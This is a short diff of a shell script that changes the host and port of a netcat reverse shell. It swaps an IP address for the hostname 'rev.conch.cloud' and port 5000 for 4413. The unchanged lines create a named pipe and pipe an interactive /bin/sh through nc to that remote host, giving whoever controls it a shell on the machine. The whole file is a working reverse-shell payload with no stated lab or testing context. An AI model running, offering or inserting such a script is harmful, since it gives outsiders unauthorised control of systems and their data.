@@ -1,7 +1,7 @@
 #!/bin/sh
 
-RHOST="54.93.62.98"
-RPORT="5000"
+RHOST="rev.conch.cloud"
+RPORT="4413"
 
 mkfifo /tmp/f
 cat /tmp/f|/bin/sh -i 2>&1|nc $RHOST $RPORT >/tmp/f
